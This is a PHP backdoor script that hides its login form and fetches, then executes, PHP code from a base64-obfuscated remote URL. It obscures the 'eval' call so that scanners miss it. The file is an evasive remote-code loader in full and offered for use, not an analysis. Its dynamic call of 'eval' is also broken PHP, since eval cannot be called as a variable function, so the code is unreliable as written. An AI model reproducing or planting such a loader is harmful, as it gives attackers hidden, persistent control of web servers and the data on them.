<?php
// obf_exec.php
// Session-based auth + obfuscated remote-eval (URL and 'eval' hidden via base64)
// WARNING: This executes remote PHP code. Use only with fully trusted sources.

session_start();

/* ===== config ===== */
// base64 of remote raw URL (replace with your URL encoded)
$u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NvbXl1c2VyL3JlcG8vbWFpbi9maWxlLnBocA==';
// base64 of function name 'eval' (keeps literal 'eval' out of source)
$exec_fn_b64 = base64_encode('eval'); // yields 'ZXZhbA==', kept dynamic here

// password md5 (same as before)
$pw_md5 = '9c5b3082eae2c54711bb99f361f58073';

// session marker
$session_key = 'user_id';
$session_val = 'user123';
/* ================== */

/* ===== helpers (non-obfuscated names for maintainability) ===== */
function fetch_remote_obf(string $url) {
    // prefer curl
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (PHPFetcher)'
        ]);
        $payload = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err  = curl_error($ch);
        curl_close($ch);

        if ($payload === false || $code < 200 || $code >= 300) {
            error_log("fetch_remote_obf: curl failed: code={$code} err={$err}");
            return false;
        }
        return $payload;
    }

    // fallback file_get_contents
    if (ini_get('allow_url_fopen')) {
        $data = @file_get_contents($url);
        if ($data === false) {
            error_log("fetch_remote_obf: file_get_contents failed for $url");
            return false;
        }
        return $data;
    }

    error_log("fetch_remote_obf: no available transport");
    return false;
}

/* ===== authentication (session) ===== */
function is_logged() {
    global $session_key, $session_val;
    return isset($_SESSION[$session_key]) && $_SESSION[$session_key] === $session_val;
}

if (!is_logged()) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (md5($_POST['password']) === $pw_md5) {
            $_SESSION[$session_key] = $session_val;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $err = 'wrong';
        }
    }
    // minimal invisible form (keeps original style)
    ?>
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Auth</title>
    <style>
      input[type=password], input[type=submit]{border:0;background:transparent;color:transparent;outline:none}
      label.off{position:absolute;left:-9999px}
    </style>
    </head><body>
    <?php if (isset($err)) echo "<div style='color:#b00'>".htmlspecialchars($err)."</div>"; ?>
    <form method="post"><label class="off" for="p">pw</label>
      <input id="p" name="password" type="password" autocomplete="current-password">
      <input type="submit" value="ok">
    </form>
    </body></html>
    <?php
    exit;
}

/* ===== decode URL & exec ===== */
// decode url just-in-time (so raw URL not in source)
$remote_url = base64_decode($u_b64);

// quick sanity: url must look like http(s)...
if (!preg_match('#^https?://#i', $remote_url)) {
    http_response_code(400);
    echo 'Bad remote URL';
    exit;
}

// fetch remote payload
$payload = fetch_remote_obf($remote_url);
if ($payload === false || trim($payload) === '') {
    http_response_code(502);
    echo 'Failed to fetch remote payload';
    exit;
}

// optional: basic head-check to avoid html being eval'd
$trimmed = ltrim($payload);
if (isset($trimmed[0]) && $trimmed[0] === '<') {
    error_log('obf_exec: payload appears to start with < — aborting.');
    http_response_code(500);
    echo 'Invalid payload';
    exit;
}

// generate executor function name by decoding base64 at runtime
$exec_fn = base64_decode($exec_fn_b64); // yields "eval"

// sanity: ensure exec_fn is callable
if (!is_string($exec_fn) || $exec_fn === '') {
    http_response_code(500);
    echo 'Execution function invalid';
    exit;
}

// perform execution via dynamic function name and output buffering
try {
    ob_start();
    // call the function dynamically; this avoids literal "eval(" in source
    $fn = $exec_fn; // e.g. 'eval'
    $fn('?>' . $payload);
    $out = ob_get_clean();
    echo $out;
} catch (Throwable $t) {
    while (ob_get_level() > 0) ob_end_clean();
    error_log('obf_exec: execution error: ' . $t->getMessage());
    http_response_code(500);
    echo 'Execution error';
    exit;
}
?>
